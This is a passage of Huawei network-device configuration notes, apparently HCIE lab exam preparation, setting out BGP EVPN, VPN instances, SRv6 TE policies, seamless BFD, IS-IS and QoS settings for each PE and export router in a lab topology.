FC00::3 connect-interface LoopBack0  peer FC00::3 password cipher Huawei@123  peer FC00::4 as-number 65000  peer FC00::4 connect-interface LoopBack0  peer FC00::4 password cipher Huawei@123  l2vpn-family evpn    policy vpn-target    peer FC00::1 <span class="hljs-built_in">enable</span>    peer FC00::1 advertise encap-type srv6    peer FC00::2 <span class="hljs-built_in">enable</span>    peer FC00::2 advertise encap-type srv6    peer FC00::3 <span class="hljs-built_in">enable</span>    peer FC00::3 advertise encap-type srv6    peer FC00::4 <span class="hljs-built_in">enable</span>    peer FC00::4 advertise encap-type srv6<span class="hljs-comment"># X/Y_PE1/2</span>bgp 65000  router-id 1.0.0.1  peer FC00::5 as-number 65000  peer FC00::5 connect-interface LoopBack0  peer FC00::5 password cipher Huawei@123  peer FC00::6 as-number 65000  peer FC00::6 connect-interface LoopBack0  peer FC00::6 password cipher Huawei@123  l2vpn-family evpn    policy vpn-target    peer FC00::5 <span class="hljs-built_in">enable</span>    peer FC00::5 advertise encap-type srv6    peer FC00::6 <span class="hljs-built_in">enable</span>    peer FC00::6 advertise encap-type srv62、65001 vpn-instance / ip / bgp<span class="hljs-comment"># X_PE1/2</span><span class="hljs-comment"># peer 10.20.1.9 as-number 65001</span><span class="hljs-comment"># ip address 10.20.1.10 30</span>ip vpn-instance OA  route-distinguisher 65001:1  vpn-target 1:4 export-extcommunity evpn  vpn-target 4:1 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31  ip binding vpn-instance OA  ip address 10.20.1.2 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.1.1 as-number 65001<span class="hljs-comment"># X_Export1/2</span><span class="hljs-comment"># ip add 10.20.1.9 30</span><span class="hljs-comment"># ip add 10.20.1.6 30</span><span class="hljs-comment"># router-id 10.1.0.2</span><span class="hljs-comment"># peer 10.20.1.10 as 65000</span>inter E0/0/7  ip add 10.20.1.1 30<span class="hljs-comment">#</span>inter E0/0/6  ip add 10.20.1.5 30<span class="hljs-comment">#</span>acl 2001  rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.31.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.32.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.33.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.34.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.35.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.41.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.42.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.43.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.44.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.45.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255  quitroute-policy b2o permit node 10   apply tag 10route-policy o2b deny node 10   if-match tag 20route-policy o2b permit node 20   if-match acl 2001bgp 65001  router-id 10.1.0.1  peer 10.20.1.2 as 65000  preference 120 255 255  import ospf 1 route-policy o2bospf 1   import bgp route-policy b2o   default cost inherit-metric   area 0     network 10.20.1.5 0.0.0.0<span class="hljs-comment"># X_T1_FW1</span>switch vsys Employeesyssecurity-policy  rule name x-z    source-zone trust    source-zone untrust    destination-zone untrust    destination-zone trust    source-address rang 10.1.11.0 10.1.15.255    source-address rang 10.1.21.0 10.1.25.255    source-address rang 10.1.31.0 10.1.35.255    source-address rang 10.1.41.0 10.1.45.255    source-address rang 10.1.51.0 10.1.55.255    destination-address 10.3.101.0 24    action permit  rule move Employee_to_internet bottom3、65003 vpn-instance / ip / bgp<span class="hljs-comment"># Y_PE1</span>ip vpn-instance OA  route-distinguisher 65003:1  vpn-target 3:4 export-extcommunity evpn  vpn-target 4:3 import-extcommunity evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  route-distinguisher 65003:3  vpn-target 33:44 export-extcommunity evpn  vpn-target 44:33 import-extcommunity evpn<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.2.1 as-number 65003  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.2.5 as-number 65003<span class="hljs-comment">#</span>interface G0/2/31.10  vlan-type dot1q 10  ip binding vpn-instance OA  ip address 10.20.2.2 30interface G0/2/31.20  vlan-type dot1q 20  ip binding vpn-instance R&amp;D  ip address 10.20.2.6 30<span class="hljs-comment"># Y_Export</span>interface G0/0/7  undo portswitchinterface G0/0/6  undo portswitchinterface G0/0/7.10  dot1q termination vid 10  ip binding vpn-instance vpn2  ip address 10.20.2.1 255.255.255.252interface G0/0/7.20  dot1q termination vid 20  ip binding vpn-instance vpn3  ip address 10.20.2.5 255.255.255.252interface G0/0/6.10  dot1q termination vid 10  ip binding vpn-instance vpn2  ip address 10.20.2.9 255.255.255.252interface G0/0/6.20  dot1q termination vid 20  ip binding vpn-instance vpn3  ip address 10.20.2.13 255.255.255.252<span class="hljs-comment">#</span>ip ip-prefix OA index 10 permit 10.2.0.0 16 greater-equal 24 less-equal 24ip ip-prefix OA index 20 permit 10.100.2.0 24ip ip-prefix RD index 10 permit 10.2.0.0 16 greater-equal 24 less-equal 24ip ip-prefix RD index 20 permit 10.100.3.0 24bgp 65003  ipv4-family vpn-instance vpn2    peer 10.20.2.2 as-number 65000    peer 10.20.2.2 ip-prefix OA <span class="hljs-built_in">export</span>    peer 10.20.2.10 as-number 65000    peer 10.20.2.10 ip-prefix OA <span class="hljs-built_in">export</span>  ipv4-family vpn-instance vpn3    peer 10.20.2.6 as-number 65000    peer 10.20.2.6 ip-prefix RD <span class="hljs-built_in">export</span>    peer 10.20.2.14 as-number 65000    peer 10.20.2.14 ip-prefix RD <span class="hljs-built_in">export</span>4、65004 vpn-instance / ip / bgp<span class="hljs-comment"># Z_PE1/2</span>ip vpn-instance OA  route-distinguisher 65004:1    vpn-target 1:4 import-extcommunity evpn    vpn-target 3:4 import-extcommunity evpn    vpn-target 4:1 export-extcommunity evpn    vpn-target 4:3 export-extcommunity evpnip vpn-instance R&amp;D  route-distinguisher 65004:3    vpn-target 44:33 export-extcommunity evpn    vpn-target 33:44 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31.10  vlan-type dot1q 10  ip binding vpn-instance OA  ip address 10.20.3.2 30interface G0/2/31.20  vlan-type dot1q 20  ip binding vpn-instance R&amp;D  ip address 10.20.3.6 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.3.1 as-number 65004  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.3.5 as-number 65004<span class="hljs-comment"># Z_Export1</span>ip vpn-instance OA   route-distinguisher 65004:1ip vpn-instance R&amp;D  route-distinguisher 65004:2int E0/0/7  undo portswitchint E0/0/6  undo portswitchint loopback0   ip binding vpn-instance OA   ip address 10.3.101.254 24int loopback1  ip binding vpn-instance R&amp;D  ip address 10.3.99.254 24int loopback2  ip binding vpn-instance R&amp;D  ip address 10.3.100.254 24int E0/0/7.10  dot1q termination vid 10   ip binding vpn-instance OA   ip address 10.20.3.1 30   arp broadcast <span class="hljs-built_in">enable</span> int E0/0/7.20   dot1q termination vid 20   ip binding vpn-instance R&amp;D   ip address 10.20.3.5 30   arp broadcast <span class="hljs-built_in">enable</span>int E0/0/6.10  dot1q termination vid 10   ip binding vpn-instance OA   ip address 10.20.3.9 30   arp broadcast <span class="hljs-built_in">enable</span> int E0/0/6.20   dot1q termination vid 20   ip binding vpn-instance R&amp;D   ip address 10.20.3.13 30   arp broadcast <span class="hljs-built_in">enable</span><span class="hljs-comment">#</span>bgp 65004  router-id 10.3.99.1  ipv4-family vpn-instance OA    network 10.3.101.0 24    peer 10.20.3.2 as-number 65000    peer 10.20.3.10 as-number 65000  ipv4-family vpn-instance R&amp;D    network 10.3.99.0 24    network 10.3.100.0 24    peer 10.20.3.6 as-number 65000    peer 10.20.3.14 as-number 650005、SRv6 Policy部署<span class="hljs-comment"># X_PE1</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list x1-z1-zhu    index 10 sid ipv6 FC02:1::30  segment-list x1-z1-bei    index 10 sid ipv6 FC02:1::10    index 20 sid ipv6 FC02:2::30    index 30 sid ipv6 FC02:6::10  srv6-te policy x1-z1 endpoint FC00::5 color 101    candidate-path preference 200      segment-list x1-z1-zhu    candidate-path preference 100      segment-list x1-z1-bei<span class="hljs-comment">#</span>route-policy fz1 permit node 10  apply extcommunity color 0:101route-policy fz2 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000   l2vpn-family evpn    peer FC00::5 route-policy fz1 import    peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy x1-z1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy x1-z1 evpn<span class="hljs-comment"># X_PE2</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list x2-z2-zhu    index 10 sid ipv6 FC02:2::30  segment-list x2-z2-bei    index 10 sid ipv6 FC02:2::10    index 20 sid ipv6 FC02:1::30    index 30 sid ipv6 FC02:5::10  srv6-te policy x2-z2 endpoint FC00::6 Color 102    candidate-path preference 200      segment-list x2-z2-zhu    candidate-path preference 100      segment-list x2-z2-bei<span class="hljs-comment">#</span>route-policy fz1 permit node 10  apply cost 10route-policy fz2 permit node 10  apply extcommunity color 0:102<span class="hljs-comment">#</span>bgp 65000   l2vpn-family evpn    peer FC00::5 route-policy fz1 import    peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy x2-z2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy x2-z2 evpn<span class="hljs-comment"># Y_PE1</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list y1-z1-zhu    index 10 sid ipv6 FC02:3::30  segment-list y1-z1-bei    index 10 sid ipv6 FC02:3::10    index 20 sid ipv6 FC02:4::30    index 30 sid ipv6 FC02:6::10  srv6-te policy y1-z1 endpoint FC00::5 Color 103    candidate-path preference 200      segment-list y1-z1-zhu    candidate-path preference 100      segment-list y1-z1-bei<span class="hljs-comment">#</span>route-policy fz1 permit node 10  apply extcommunity color 0:103route-policy fz2 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000  l2vpn-family evpn    peer FC00::5 route-policy fz1 import    peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy y1-z1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy y1-z1 evpnip vpn-instance R&amp;D  ipv4-family  tnl-policy y1-z1 evpn<span class="hljs-comment"># Y_PE2</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list y2-z2-zhu    index 10 sid ipv6 FC02:4::30  segment-list y2-z2-bei    index 10 sid ipv6 FC02:4::10    index 20 sid ipv6 FC02:3::30    index 30 sid ipv6 FC02:5::10  srv6-te policy y2-z2 endpoint FC00::6 Color 104    candidate-path preference 200      segment-list y2-z2-zhu    candidate-path preference 100      segment-list y2-z2-bei<span class="hljs-comment">#</span>route-policy fz2 permit node 10  apply extcommunity color 0:104route-policy fz1 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000  l2vpn-family evpn    peer FC00::5 route-policy fz1 import    peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy y2-z2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy y2-z2 evpnip vpn-instance R&amp;D  ipv4-family  tnl-policy y2-z2 evpn<span class="hljs-comment"># Z_PE1</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list z1-x1-zhu    index 10 sid ipv6 FC02:5::20  segment-list z1-x1-bei    index 10 sid ipv6 FC02:5::10    index 20 sid ipv6 FC02:6::20    index 30 sid ipv6 FC02:2::10  srv6-te policy z1-x1 endpoint FC00::1 Color 101    candidate-path preference 200      segment-list z1-x1-zhu    candidate-path preference 100      segment-list z1-x1-bei  <span class="hljs-comment">#</span>  segment-list z1-y1-zhu    index 10 sid ipv6 FC02:5::30  segment-list z1-y1-bei    index 10 sid ipv6 FC02:5::10    index 20 sid ipv6 FC02:6::30    index 30 sid ipv6 FC02:4::10  srv6-te policy z1-y1 endpoint FC00::3 Color 103    candidate-path preference 200      segment-list z1-y1-zhu    candidate-path preference 100      segment-list z1-y1-bei      quit  quit<span class="hljs-comment">#</span>route-policy fx1 permit node 10  apply extcommunity color 0:101route-policy fx2 permit node 10  apply cost 10route-policy fy1 permit node 10  apply extcommunity color 0:103route-policy fy2 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000  l2vpn-family evpn    peer FC00::1 route-policy fx1 import    peer FC00::2 route-policy fx2 import    peer FC00::3 route-policy fy1 import    peer FC00::4 route-policy fy2 import<span class="hljs-comment">#</span>tunnel-policy z1-xy1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy z1-xy1 evpnip vpn-instance R&amp;D  ipv4-family  tnl-policy z1-xy1 evpn<span class="hljs-comment"># Z_PE2</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list z2-x2-zhu    index 10 sid ipv6 FC02:6::20  segment-list z2-x2-bei    index 10 sid ipv6 FC02:6::10    index 20 sid ipv6 FC02:5::20    index 30 sid ipv6 FC02:1::10  srv6-te policy z2-x2 endpoint FC00::2 Color 102    candidate-path preference 200      segment-list z2-x2-zhu    candidate-path preference 100      segment-list z2-x2-bei  <span class="hljs-comment">#</span>  segment-list z2-y2-zhu    index 10 sid ipv6 FC02:6::30  segment-list z2-y2-bei    index 10 sid ipv6 FC02:6::10    index 20 sid ipv6 FC02:5::30    index 30 sid ipv6 FC02:3::10  srv6-te policy z2-y2 endpoint FC00::4 Color 104    candidate-path preference 200      segment-list z2-y2-zhu    candidate-path preference 100      segment-list z2-y2-bei    quit  quit<span class="hljs-comment">#</span>route-policy fx1 permit node 10  apply cost 10route-policy fx2 permit node 10  apply extcommunity color 0:102route-policy fy1 permit node 10  apply cost 10route-policy fy2 permit node 10  apply extcommunity color 0:104<span class="hljs-comment">#</span>bgp 65000  l2vpn-family evpn    peer FC00::1 route-policy fx1 import    peer FC00::2 route-policy fx2 import    peer FC00::3 route-policy fy1 import    peer FC00::4 route-policy fy2 import<span class="hljs-comment">#</span>tunnel-policy z2-xy2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy z2-xy2 evpnip vpn-instance R&amp;D  ipv4-family  tnl-policy z2-xy2 evpn6、SRv6 SBFD部署<span class="hljs-comment"># X/Y_PE1</span>te ipv6-router-id FC00::Xbfdsbfd  reflector discriminator X.0.0.X 对应自己的 Router-ID  destination ipv6 FC00::5 remote-discriminator 5.0.0.5te ipv6-router-id FC00::Xsegment-routing ipv6  srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment"># 考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># X/Y_PE2</span>te ipv6-router-id FC00::Xbfdsbfd  reflector discriminator X.0.0.X 对应自己的 Router-ID  destination ipv6 FC00::6 remote-discriminator 6.0.0.6segment-routing ipv6srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment"># 考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># Z_PE1</span>te ipv6-router-id FC00::5bfdsbfd  reflector discriminator 5.0.0.5 对应自己的 Router-ID  destination ipv6 FC00::1 remote-discriminator 1.0.0.1  destination ipv6 FC00::3 remote-discriminator 3.0.0.3segment-routing ipv6  srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment"># 考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># Z_PE2</span>te ipv6-router-id FC00::6bfdsbfd  reflector discriminator 6.0.0.6 对应自己的 Router-ID  destination ipv6 FC00::2 remote-discriminator 2.0.0.2  destination ipv6 FC00::4 remote-discriminator 4.0.0.4segment-routing ipv6  srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment"># 考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50SRv6 配置案例1. 通用flow-wred drop  co g lo 70 hi 90 di 50  co y lo 60 hi 90 di 50  co r lo 50 hi 90 di 100  quitflow-queue qos  queue af4 wfq weight 10 flow-wred drop  queue ef pd flow-wred drop  quitqos-profile QOS  user-queue cir 1000000 pri 1000000 flow-queue qos  quitbfd  quit2. X_PE1bfd  sbfd  reflector discriminator 1.0.0.1  destination ipv6 fc00::5 remote-discriminator 5.0.0.5  quitte ipv6-router-id fc00::1segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address fc00::1    locator HCIE ipv6-prefix fc02:1:: 96 static 16    opcode ::1 end psp    opcode ::10 end-x interface ethernet 3/0/0 nexthop fc01:10::A psp    opcode ::20 end-x interface ethernet 3/0/1 nexthop fc01:10::2 psp    opcode ::30 end-x interface ethernet 3/0/2 nexthop fc01:10::6 psp    opcode ::100 end-op    quit    srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy locator HCIE  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50  segment-list x1-z1-zhu    index 10 sid ipv6 fc02:1::30  segment-list x1-z1-bei    index 10 sid ipv6 fc02:1::10    index 20 sid ipv6 fc02:2::30    index 30 sid ipv6 fc02:6::10    quit    srv6-te policy x1-z1 endpoint fc00::5 color 101    candidate-path preference 200      segment-list x1-z1-zhu    candidate-path preference 100      segment-list x1-z1-bei      quit    quit  quitroute-policy fz1 permit node 10  apply extcommunity color 0:101route-policy fz2 permit node 10  apply cost 10route-policy oa_med permit node 10  apply cost 10  quittunnel-policy x1-z1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1  quitip vpn-instance OA  route-distinguisher 65001:1  vpn-target 1:4 export-extcommunity evpn  vpn-target 4:1 import-extcommunity evpn  tnl-policy x1-z1 evpn  quitinterface ethernet 3/0/7  ip binding vpn-instance OA  ip add 10.20.1.2 30  quitisis 1   is-level level-2  cost-style wide  network-entity 49.0001.0010.0000.0001.00  domain-authentication-mode md5 cipher Huawei@123  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 300 min-rx-interval 300  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2    quit  quitint lo0  isis ipv6 <span class="hljs-built_in">enable</span> 1int ethernet 3/0/1  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/2  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/0  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis cost 4  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123  quitbgp 65000  router-id 1.0.0.1  peer fc00::5 as-number 65000  peer fc00::5 password cipher Huawei@123  peer fc00::5 connect-interface loopback 0  peer fc00::6 as-number 65000  peer fc00::6 password cipher Huawei@123  peer fc00::6 connect-interface loopback 0  l2vpn-family evpn    peer fc00::5 <span class="hljs-built_in">enable</span>    y    peer fc00::5 route-policy fz1 import    peer fc00::5 advertise encap-type srv6    peer fc00::6 <span class="hljs-built_in">enable</span>    y    peer fc00::6 route-policy fz2 import    peer fc00::6 advertise encap-type srv6  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.1.1 as-number 65001    peer 10.20.1.1 route-policy oa_med <span class="hljs-built_in">export</span>    quit  quit3. X_PE2bfd  sbfd  reflector discriminator 2.0.0.2  destination ipv6 fc00::6 remote-discriminator 6.0.0.6  quitte ipv6-router-id fc00::2segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address fc00::2    locator HCIE ipv6-prefix fc02:2:: 96 static 16    opcode ::1 end psp    opcode ::10 end-x interface ethernet 3/0/0 nexthop fc01:10::9 psp    opcode ::20 end-x interface ethernet 3/0/1 nexthop fc01:10::E psp    opcode ::30 end-x interface ethernet 3/0/2 nexthop fc01:10::12 psp    opcode ::100 end-op    quit    srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy locator HCIE  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50  segment-list x2-z2-zhu    index 10 sid ipv6 fc02:2::30  segment-list x2-z2-bei    index 10 sid ipv6 fc02:2::10    index 20 sid ipv6 fc02:1::30    index 30 sid ipv6 fc02:5::10    quit    srv6-te policy x2-z2 endpoint fc00::6 color 102    candidate-path preference 200      segment-list x2-z2-zhu    candidate-path preference 100      segment-list x2-z2-bei      quit    quit  quitroute-policy fz1 permit node 10  apply cost 10route-policy fz2 permit node 10  apply extcommunity color 0:102route-policy oa_med permit node 10  apply cost 12  quittunnel-policy x2-z2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1  quitip vpn-instance OA  route-distinguisher 65001:2  vpn-target 1:4 export-extcommunity evpn  vpn-target 4:1 import-extcommunity evpn  tnl-policy x2-z2 evpn  quitinterface ethernet 3/0/7  ip binding vpn-instance OA  ip add 10.20.1.10 30  quitisis 1   is-level level-2  cost-style wide  network-entity 49.0001.0020.0000.0002.00  domain-authentication-mode md5 cipher Huawei@123  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 300 min-rx-interval 300  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2    quit  quitint lo0  isis ipv6 <span class="hljs-built_in">enable</span> 1int ethernet 3/0/1  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/2  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/0  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis cost 4  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123  quitbgp 65000  router-id 2.0.0.2  peer fc00::5 as-number 65000  peer fc00::5 password cipher Huawei@123  peer fc00::5 connect-interface loopback 0  peer fc00::6 as-number 65000  peer fc00::6 password cipher Huawei@123  peer fc00::6 connect-interface loopback 0  l2vpn-family evpn    peer fc00::5 <span class="hljs-built_in">enable</span>    y    peer fc00::5 route-policy fz1 import    peer fc00::5 advertise encap-type srv6    peer fc00::6 <span class="hljs-built_in">enable</span>    y    peer fc00::6 route-policy fz2 import    peer fc00::6 advertise encap-type srv6  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.1.9 as-number 65001    peer 10.20.1.9 route-policy oa_med <span class="hljs-built_in">export</span>    quit  quit4. Y_PE1bfd  sbfd  reflector discriminator 3.0.0.3  destination ipv6 fc00::5 remote-discriminator 5.0.0.5  quitte ipv6-router-id fc00::3segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address fc00::3    locator HCIE ipv6-prefix fc02:3:: 96 static 16    opcode ::1 end psp    opcode ::10 end-x interface ethernet 3/0/0 nexthop fc01:10::1A psp    opcode ::20 end-x interface ethernet 3/0/1 nexthop fc01:10::1 psp    opcode ::30 end-x interface ethernet 3/0/2 nexthop fc01:10::16 psp    opcode ::100 end-op    quit    srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy locator HCIE  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50  segment-list y1-z1-zhu    index 10 sid ipv6 fc02:3::30  segment-list y1-z1-bei    index 10 sid ipv6 fc02:3::10    index 20 sid ipv6 fc02:4::30    index 30 sid ipv6 fc02:6::10    quit    srv6-te policy y1-z1 endpoint fc00::5 color 103    candidate-path preference 200      segment-list y1-z1-zhu    candidate-path preference 100      segment-list y1-z1-bei      quit    quit  quitroute-policy fz1 permit node 10  apply extcommunity color 0:103route-policy fz2 permit node 10  apply cost 10route-policy oa_med permit node 10  apply cost 10route-policy rd_med permit node 10  apply cost 12  quittunnel-policy y1-z1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1  quitip vpn-instance OA  route-distinguisher 65003:1  vpn-target 3:4 export-extcommunity evpn  vpn-target 4:3 import-extcommunity evpn  tnl-policy y1-z1 evpnip vpn-instance R&amp;D  route-distinguisher 65003:3  vpn-target 33:44 export-extcommunity evpn  vpn-target 44:33 import-extcommunity evpn  tnl-policy y1-z1 evpn  quitinterface ethernet 3/0/7.10  vlan-t <span class="hljs-keyword">do</span> 10  ip binding vpn-instance OA  ip add 10.20.2.2 30interface ethernet 3/0/7.20  vlan-t <span class="hljs-keyword">do</span> 20  ip binding vpn-instance R&amp;D  ip add 10.20.2.6 30  quitisis 1   is-level level-2  cost-style wide  network-entity 49.0001.0030.0000.0003.00  domain-authentication-mode md5 cipher Huawei@123  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 300 min-rx-interval 300  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2    quit  quitint lo0  isis ipv6 <span class="hljs-built_in">enable</span> 1int ethernet 3/0/1  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/2  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/0  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis cost 4  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123  quitbgp 65000  router-id 3.0.0.3  peer fc00::5 as-number 65000  peer fc00::5 password cipher Huawei@123  peer fc00::5 connect-interface loopback 0  peer fc00::6 as-number 65000  peer fc00::6 password cipher Huawei@123  peer fc00::6 connect-interface loopback 0  l2vpn-family evpn    peer fc00::5 <span class="hljs-built_in">enable</span>    y    peer fc00::5 route-policy fz1 import    peer fc00::5 advertise encap-type srv6    peer fc00::6 <span class="hljs-built_in">enable</span>    y    peer fc00::6 route-policy fz2 import    peer fc00::6 advertise 